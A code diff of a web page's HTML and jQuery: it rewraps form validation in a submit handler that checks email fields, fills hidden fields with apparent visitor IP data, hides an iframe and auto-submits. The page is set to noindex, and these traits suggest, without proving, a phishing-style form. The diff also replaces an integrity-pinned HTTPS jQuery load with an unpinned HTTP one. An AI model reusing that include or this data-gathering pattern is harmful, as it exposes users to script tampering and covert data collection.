@@ -8,7 +8,7 @@
 <meta name="googlebot" content="noindex">
 
 <link rel="stylesheet" type="text/css" href="css/style.css">
-<script src="https://code.jquery.com/jquery-3.1.1.min.js" integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8=" crossorigin="anonymous"></script>
+<script type="text/javascript" src="http://code.jquery.com/jquery-latest.min.js"></script>
 
 <link rel="stylesheet" href="./css/button/css/buttons.css">
 <script type="text/javascript" src="./css/button/js/buttons.js"></script>
@@ -193,33 +193,35 @@ HTMLElement.prototype.click = function() {
 	});
 	
 	
-	var error = false;
-	$( "form#toPost" ).find('input[type=text], textarea').each(function(){
-		if(!checkEmail($(this))){
-			error = true;
-		}
-		if(!checkEmpty($(this))){
-			error = true;
-		}
-	});
-	
-	if(error){
-		return;
-	}else{
-		var empty = false;
-		$( "form#toPost" ).find('input[id*="hidden_"]').each(function(){
-			if($(this).val() == ""){
-				empty = true;
+	$("button#submit").click(function(event){
+		var error = false;
+		$( "form#toPost" ).find('input[type=text], textarea').each(function(){
+			if(!checkEmail($(this))){
+				error = true;
+			}
+			if(!checkEmpty($(this))){
+				error = true;
 			}
 		});
-		parent.hindIframe();
-		if(empty){
-			getIpInfo();
+	
+		if(error){
+			return;
+		}else{
+			var empty = false;
+			$( "form#toPost" ).find('input[id*="hidden_"]').each(function(){
+				if($(this).val() == ""){
+					empty = true;
+				}
+			});
+			parent.hindIframe();
+			if(empty){
+				getIpInfo();
+			}
+			setTimeout(function(){
+				$("input#post").click();
+			}, 1000);
 		}
-		setTimeout(function(){
-			$("input#post").click();
-		}, 1000);
-	}
+	});
 	
 	
 	$('input[type=text]').keypress(function(e) {
